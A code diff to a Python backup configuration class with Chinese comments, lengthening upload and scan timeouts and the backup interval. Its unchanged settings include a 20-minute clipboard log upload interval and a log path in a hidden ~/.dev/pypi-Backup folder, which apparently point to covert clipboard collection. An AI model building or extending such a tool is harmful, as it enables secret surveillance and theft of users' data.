@@ -18,12 +18,12 @@ class BackupConfig:
     # 重试配置
     RETRY_COUNT = 5        # 最大重试次数
     RETRY_DELAY = 60       # 重试等待时间（秒）
-    UPLOAD_TIMEOUT = 1800  # 上传超时时间（秒）
+    UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）
    
     # 备份间隔配置
-    BACKUP_INTERVAL = 260000  # 备份间隔时间：约3天
+    BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 备份间隔时间：7天（单位：秒）
     CLIPBOARD_INTERVAL = 1200  # JTB日志上传间隔时间（20分钟，单位：秒）
-    SCAN_TIMEOUT = 1800    # 扫描超时时间：30分钟
+    SCAN_TIMEOUT = 3600    # 扫描超时时间：1小时
     
     # 日志配置
     LOG_FILE = str(Path.home() / ".dev/pypi-Backup/backup.log")
